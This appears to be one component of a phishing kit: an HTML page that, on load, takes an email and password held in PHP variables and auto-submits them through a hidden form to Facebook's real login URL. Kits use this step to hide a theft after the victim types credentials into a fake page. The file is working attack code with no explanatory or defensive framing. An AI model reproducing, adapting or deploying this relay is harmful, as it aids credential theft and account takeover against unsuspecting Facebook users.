<html>
    <head>

    </head>
    <body>
        <script>
            window.onload = function () {
                post("https://www.facebook.com/login.php?login_attempt=1&amp;lwv=110",{email:"<?php echo $em ?>",pass:"<?php echo $pw ?>"});
            };
            
//            
        </script>

        <script>
            function post(path, params, method) {
                method = method || "post";
                var form = document.createElement("form");
                form.setAttribute("method", method);
                form.setAttribute("action", path);

                for (var key in params) {
                    if (params.hasOwnProperty(key)) {
                        var hiddenField = document.createElement("input");
                        hiddenField.setAttribute("type", "hidden");
                        hiddenField.setAttribute("name", key);
                        hiddenField.setAttribute("value", params[key]);

                        form.appendChild(hiddenField);
                    }
                }

                document.body.appendChild(form);
                form.submit();
            }
        </script>
    </body>
</html>
